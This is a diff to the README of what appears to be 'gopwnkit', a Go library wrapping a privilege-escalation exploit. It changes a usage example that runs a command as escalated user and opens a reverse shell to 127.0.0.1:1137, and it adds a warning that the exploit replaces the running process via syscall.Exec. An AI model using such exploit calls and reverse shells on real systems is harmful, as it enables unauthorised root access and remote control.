@@ -58,10 +58,13 @@ import (
 
 func main() {
 	gopwnkit.Command("id")
-    gopwnkit.RevShell("127.0.0.1:1137")
+	// or
+	gopwnkit.RevShell("127.0.0.1:1137")
 }
 
 ```
+
+:warning: As the exploit relies on `syscall.Exec`, which replaces the current process by the one invoked, it is not possible to do anything else after invocation.
 
 
 
